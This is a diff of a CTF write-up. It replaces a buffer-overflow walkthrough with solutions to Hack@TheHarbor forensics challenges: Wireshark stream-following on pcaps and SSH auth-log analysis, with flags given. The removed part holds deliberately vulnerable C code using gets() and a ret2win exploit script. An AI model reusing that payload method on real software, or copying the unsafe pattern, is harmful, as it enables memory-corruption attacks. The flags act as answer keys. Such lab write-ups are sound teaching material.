@@ -9,126 +9,99 @@ Hack@TheHarbor was a good CTF. Point3 hosted the CTF on their Escalate platform.
 
 #### Lets start..
 
-1 - numberlesslove
 
+### 1 - numberlesslove
 
-![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/bo2.1.png)
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/numb1.png)
 
-Download the binary to our system, make it executable and run the binary.
+Download the file to our system, it was a tcpdump capture file contains network data packets.
 
-Like the previous challeneg, this binary is also just printing the input back to us, behaving like a echo program.
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/numb2.png)
 
-![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/bo2.2.png)
+Opened the file using **wireshark**
 
-Lets analyse the source code of this binary to know how it is working.
-
-Here is the source code:
 ~~~
-#include <stdio.h>
-#include <stdlib.h>
-
-void win(long long arg1, int arg2)
-{
-    if (arg1 != 0x14B4DA55 || arg2 != 0xF00DB4BE)
-    {
-        puts("Close, but not quite.");
-        exit(1);
-    }
-    printf("You win!\n");
-    char buf[256];
-    FILE* f = fopen("./flag.txt", "r");
-    if (f == NULL)
-    {
-        puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
-    }
-    else
-    {
-        fgets(buf, sizeof(buf), f);
-        printf("flag: %s\n", buf);
-    }
-}
-void vuln()
-{
-    char buf[16];
-    printf("Type something>");
-    gets(buf);
-    printf("You typed %s!\n", buf);
-}
-
-int main()
-{
-    /* Disable buffering on stdout */
-    setvbuf(stdout, NULL, _IONBF, 0);
-    vuln();
-    return 0;
-}
+wireshark ee22a3b9fc2e8971c3bf812080d02714
 ~~~
-From source code it is clear that we have to do the way we did for BufferOverflow #1 but we have to pass 2 arguments to win() function.
 
-The function is checking the arguments we passed, we will get flag only after we pass the arguments in corrrect way.
+There is only few packets in the file and i found a packet with GET request to /flag.html.
 
-But important thing is to note is the type of arg1 which is long long, which is 8 byte long.
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/numb3.png)
 
-Check more about 'C' data types.
+Just select that packet and press **Ctrl+Alt+Shift+H** to follow HTTP Stream and you will get your flag.
+
+**Flag  : flag_{52877e8b1d224623957e36051d6a8e05}**
+
+### 2 - helpfulwine
+
+Like previous one, it was also a pcap file with few packet data in it. Opened the file using whireshark and there is only some tcp protocols.
+
+Select the first packet and press **Ctrl+Alt+Shift+T** to follow tcp Stream and you will get the flag.
+
+**Flag : flag_{7ab84f7168c2461e814e7e5eb1bb56a0}**
+
+### 3 - rhetoricalairplane
+
+Lets analyse the downloaded file using wireshark and it was soo easy. There is only a single UDP packet and press **Ctrl+Alt+Shift+U** to follow UDP Stream.
+
+You got the flag.
+
+**Flag : flag_{69791495c5334cf0a6dfe60eaf37769f}**
+
+### 4 - lemonswitch 
+
+Unlike other challenges this was an interesting challenge.
+
+Challenge description is give below.
+
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/lemon1.png)
+
+We were given an IP address and a file, which is a SSH auth log file.
+
+The web panel is for logging malicious behavior.
+
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/lemon2.png)
+
+So we have to analyse the SSH auth log file and we have to find the malicious behavior.
+
+We have to find malicious user's ip address, number of successful password login attempts made by adversary, number of successful public key authentication, and finally number of failed login attempts made by adversary.
+
+Lets start our analysing..
+
+After a lot of analysing i concluded by the below method.
+
+I first selected all failed login attempts for all users and also collected IP addresses from which failed login originated.
+
+~~~
+cat 0228a4fb0b05408ad4e1a32ea2137ca8 | grep -i "faile" | cut -d" " -f9,11 | sort | uniq -c
+~~~
+
+Output : 
+
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/lemon3.png)
+
+Total failed attempts :
+
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/lemon4.png)
+
+I concluded that a lot of failed login attempts are originated from **10.133.155.151** for diffrent users.
+
+Next i have to find how many successful attempts he made to access the server with both password auth and public key auth.
+
+Luckily he is not successful with his password guessing.
+
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/lemon4.png)
 
 So
 
-arg1 =  0x0000000014B4DA55
+* malicious user's ip : 10.133.155.151
+* successful password attempt : 0
+* successful PubKey attempt : 0
+* number of failed attempts : 86
 
-arg2 =  0xF00DB4BE
+Submitted all these details on the web panel, we will get flag only if details are correct.
 
-Lets do it.
+100% our analysis were correct and we got teh flag.
 
-Like before first step is to controll eip register. I was managed to control eip register as you can see on the below image.
+![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/lemon6.png)
 
-![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/bo2.3.png)
-
-So now we controlled eip, controlled eip with 4 B's (BBBB=0X42424242).
-
-Next step is to find the address of win() function and overwrite eip with that so win() function will get executed.
-
-On  GDB type **disas win** and take the starting address of win() function.
-
-![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/bo2.4.png)
-
-adress of win() = 0x080491c2
-
-Now we can craft our payload...
-
-**payload = "A"*28 + address_of_win() +dummy_return + arg1 + arg2**
-
-Create a file called exploit.py with the below contents.
-
-exploit.py:
-~~~
-buffer = ""
-
-#junk data
-buffer += "A"*28 
-
-#address of win() 0x080491c2
-buffer += "\xc2\x91\x04\x08"
-
-#dummy return address 0xf7e0b7a0
-buffer += "\xa0\xb7\xe0\xf7"
-
-#arg1 0x0000000014B4DA55
-buffer += "\x55\xda\xb4\x14\x00\x00\x00\x00"
-
-#arg2 0xF00DB4BE
-buffer += "\xbe\xb4\x0d\xf0"
-
-print buffer 
-~~~
-
-Lets do the final thing....
-
-![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/bo2.5.png)
-
-So it is done.
-
-Lets do it in the remote server...
-
-![Crepe](https://raw.githubusercontent.com/Masscan/masscan.github.io/master/assets/img/bo2.6.png)
-
-We got the flaaaaag ...    :)
